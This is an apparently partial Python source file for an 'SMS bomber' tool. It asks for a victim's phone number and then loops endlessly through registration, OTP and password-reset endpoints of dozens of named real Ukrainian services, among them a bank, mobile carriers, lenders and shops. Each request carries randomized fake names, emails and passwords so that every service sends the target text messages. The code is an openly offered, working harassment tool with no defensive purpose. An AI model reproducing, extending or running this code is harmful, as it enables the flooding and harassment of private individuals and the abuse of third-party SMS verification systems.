...
def sms_bomber(target_phone_number, header):


    def if_internet(mode=0, name=None):
        try: 
            get(url='https://www.google.com', headers=header, timeout=10)
        except: 
            if mode != 1 and name is None:
                raise ConnectionError 
            else: 
                output_result_attack(mode=1)


    def start_sms_bomber(name, url, data=None, json=None): 
        global SENT_MESSAGES, NOT_SENT_MESSAGES, CHECK_INET
        ...
        try: 
            ...
            if (name == 'oschadbank.ua') and CHECK_INET == 0:
                if_internet() 
            else: 
                if_internet(mode=1, name=name)
        except KeyboardInterrupt:
            output_result_attack() 
        except: 
    ...
    def output_result_attack(mode=0):
        sent_msg = f'| Messages sent:     {SENT_MESSAGES} |'
        not_sent_msg = f'| Messages not sent: {NOT_SENT_MESSAGES} |'

        max_len = max(len(sent_msg), len(not_sent_msg))
        border = '-' * max_len
    ...
    while True: 
        ...
        father_name = choice(FATHER_NAMES)
        email = choice(EMAILS)
        ...
        for service in [
            {
                'name': 'oschadbank.ua',
                'url': f'https://c2c.oschadbank.ua/api/sms/{target_phone_number_slice_1}'
            },
            {
                'name': 'kyivstar.ua',
                ...
                'json': {
                    'action': 'registration',
                    'captcha': None,
                    'login': target_phone_number_slice_1
                }
            },
            {
                'name': 'germes.one',
                'url': 'https://germes.one/ajax/registration/',
                'data': {
                    'userFirstName': name,
                    'userTel': target_phone_number,
                    'userEmail': email,
            ...
            {
                'name': 'vizitka.ua',
                'url': 'https://vizitka.ua/pages/fns/index.php',
                'data': {
                    'action': 'customerRegister',
                    'phone': f'{target_phone_number[0:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
                }
            },
            {
                'name': 'pidbir.com',
                'url': 'https://pidbir.com/lib/ajax.php',
                'data': {
                    'command': 'auth',
            ...
            {
                'name': 'creditkasa.ua',
                'url': 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode',
                'json': {
                    'brandName': 'NaVse',
                    'mobilePhone': target_phone_number_slice_1,
            ...
            },
            {
                ...
                'data': {
                    '_token': 'C7xZ8x0Zk8gwbCVSCcOxPo4Wd0LtEbMTS7SKka6u',
                    'identity': target_phone_number
                }
            },
            {
                'name': 'pizza.od.ua',
                'url': 'https://pizza.od.ua/ajax/reg.php',
                'data': {
                    'james': 'bond',
                    'phone': f'{target_phone_number[0:3]}({target_phone_number[3:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
                }
            ...
            {
                'name': 'stylus.ua',
                'url': 'https://gateway.prod.stylusapp.click/auth/register',
                'json': {
                    'phone': target_phone_number,
                    'email': email,
                    'first_name': name,
            ...
            },
            {
                ...
                'data': {'phone': target_phone_number}
            },
            {
                'name': 'megasport.ua',
                'url': 'https://megasport.ua/api/auth/phone/?auth=web_client_2&language=ua',
                'json': {'phone': target_phone_number}
            },
            {
                'name': 'bi.ua',
                'url': 'https://bi.ua/api/v1/accounts',
                'json': {
                    'grand_type': 'call_code',
                    'login': name,
                    'phone': target_phone_number_slice_1,
                    'stage': '1'
                }
            },
            {
                ...
                'json': {
                    ...
                    'lastName': surname,
                    'phone': target_phone_number,
                    'udriveEmployee': False
                }
            },
            {
                'name': 'chicco.com.ua',
                'url': 'https://chicco.com.ua/api/user/public/register/phone',
                'json': {
                    'firstName': name,
                    'language': 'ua',
                    'phone': target_phone_number_slice_1,
                    'pregnancyDueDate': None,
                    'project': 'chicco'
                }
            },
            {
                ...
                'data': {
                    ...
                    'password2': password,
                    'code': '',
                    'action': 'register_user_new',
                    'nonce_code': '24432a728f'
                }
            },
            {
                'name': 'finsfera.ua',
                'url': 'https://api.finsfera.ua/client',
                'json': {
                    'operationName': 'SendCode',
                    'query': 'mutation SendCode($phone: String!, $channel: smsChannel) { sendCode(phone: $phone, channel: $channel) { ... on SendCode { message __typename } ... on Error { warnings { warning key __typename } error __typename } __typename }}',
                    'variables': {
                        'channel': 'SMS',
                        'phone': f'{target_phone_number[0:4]} ({target_phone_number[4:6]}) {target_phone_number[6:9]} {target_phone_number[9:11]} {target_phone_number[11:13]}'
                    }
                }
            },
            {
                'name': 'varus.ua',
                'url': 'https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ru',
                'json': {'phone': target_phone_number}
            },
            {
                'name': 'multiplex.ua',
                'url': 'https://auth2.multiplex.ua/login',
                'json': {'login': target_phone_number_slice_1}
            },
            {
                'name': 'rieltor.ua',
            ...
            },
            {
                ...
                'json': {
                    ...
                    'phone': f'{target_phone_number[:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}',
                    'surname': surname
                }
            },
            {
                'name': 'credit7.ua',
                'url': 'https://credit7.ua/client/registration/general-information',
                'data': {
                    'customer_profile_id': '',
                    'mobile_phone': f'({target_phone_number[3:6]})+{target_phone_number[6:9]}+{target_phone_number[9:11]}+{target_phone_number[11:13]}',
                    'date_of_birth': choice(['11.11.2001', '10.10.2000', '19.11.1999', '20.10.2002', '12.12.2002'])
                }
            },
            {
                'name': 'prostor.ua',
                'url': 'https://prostor.ua/ua/rest/V1/customer/send-otp/',
                'json': {'phoneNumber': target_phone_number_slice_1}
            },
            {
                'name': 'germes.one',
                'url': 'https://germes.one/ajax/authorization/',
                'data': {'userTelEmail': target_phone_number}
            },
            {
                'name': 'kvytok.co',
                'url': 'https://xn--90aiim0b.com.ua/loginsms.php',
                'data': {
                    'phone': target_phone_number,
                    'sms': '',
                    'act': 'sendpassword'
            ...
            },
            {
                ...
                'json': {
                    'mobilePhone': target_phone_number_slice_1,
                    'productGroup': 'PDL',
                    'brandName': 'CreditKasa'
                }
            },
            {
                'name': 'avrora.ua',
                'url': 'https://avrora.ua/index.php?dispatch=otp.send',
                'json': {
                    'phone': target_phone_number_slice_2_with_the_figure_breckets,
                    'security_hash': 'e12440eaedeb21d6faad4721f673325f',
                    'is_ajax': '1'
                }
            },
            {
                'name': 'pavluks-trans.com',
            ...
            {
                'name': 'www.tavriav.ua',
                'url': 'https://www.tavriav.ua/send-email',
                'data': {
                    'username': target_phone_number_slice_1,
                    'phone': 'phone'
                }
            },
            {
                'name': 'kitchen-profi.com.ua',
                'url': 'https://kitchen-profi.com.ua/index.php?route=account/otp/send',
                'json': {
                    'telephone': f'{target_phone_number[0:3]}({target_phone_number[3:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
                }
            },
            {
                'name': 'tehnomarket.ua',
                'url': 'https://tehnomarket.ua/handler_ajax.php',
                'data': {
                    'action': 'register',
                    'data[action]': 'register',
                    'data[fname]': name,
                    'data[lname]': surname,
                    'data[login]': target_phone_number,
                    'data[password]': password
                }
            },
            {
                'name': 'sex-shop-g.com.ua',
                'url': 'https://sex-shop-g.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',
                'data': {
                    'phone': f'{target_phone_number[0:3]}({target_phone_number[3:6]})+{target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
                }
            },
            {
                'name': 'eleyus.com',
                'url': 'https://eleyus.com/api/v1/auth/registration/',
                'json': {
                    'emailPhone': target_phone_number,
                    'firstName': name,
                    'lastName': surname,
                    'newEmailPhone': '',
                    'password': password
            ...
            {
                'name': 'prosto.net',
                'url': f'https://api.prosto.net/v2/verify?type=intl_phone&value=%{target_phone_number_slice_1}'
            },
            {
                'name': 'maslotom.com',
                'url': 'https://maslotom.com/api/index.php?route=api/account/phoneLogin',
                'data': {
                    'phone': f'{target_phone_number[:4]}({target_phone_number[4:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
                }
            },
            {
                'name': 'shop.kyivstar.ua',
                'url': f'https://shop.kyivstar.ua/api/v2/otp_login/send/{target_phone_number[3:]}'
            },
            {
                'name': 'autoplus.ua',
                'url': 'https://autoplus.ua/users/sendcode',
                'json': {
                    'counter': 0,
                    'phone': f'({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}',
                    'source': 'auth'
                }
            },
            {
                'name': 'vivat.com.ua',
                'url': f'https://vivat.com.ua/phone_auth/request/{target_phone_number_slice_1}?lang=uk'
            },
            {
                'name': 'creditkasa.ua',
                'url': 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode',
            ...
            {
                'name': 'holdyou.net',
                'url': 'https://holdyou.net/api/users/forgot-password',
                'json': {'username': target_phone_number_slice_1}
            },
            {
                'name': 'pizza.od.ua',
                'url': 'https://pizza.od.ua/ajax/forgot.php',
                'data': {
                    'james': 'bond',
                    'phone': f'{target_phone_number[0:3]}({target_phone_number[3:6]}){target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}',
                    'login': ''
            ...
            },
            {
                ...
                'url': 'https://vizitka.ua/pages/fns/index.php',
                'data': {
                    'action': 'forg_pass_verify',
                    'subAction': 'forgotPass',
                    'phone': f'{target_phone_number[0:3]} ({target_phone_number[3:6]}) {target_phone_number[6:9]}-{target_phone_number[9:11]}-{target_phone_number[11:13]}'
                }
            },
            {
    ...
    while True: 
        try: 
            match input('Enter phone number --> '):
                ...
                case 'clear': 
                    shell('cls' if platform == 'win32' else 'clear')
                case 'exit': 
                    abort()
                case victim_phone_number: 
                    phone_number = ''.join(victim_phone_number.split())
                    
                    phone_number_slice_0 = phone_number[0] == '0'
                    phone_number_slice_3 = phone_number[:3] == '380'
                    phone_number_slice_4 = phone_number[:4] == '+380' 
                    phone_number_slice_digit = phone_number[0] != '0'
                    ...
                    or phone_number_slice_digit and phone_number[0] != '0'
                        ...
                        sms_bomber(target_phone_number=phone_number, header=choice(HEADERS))
                    else:
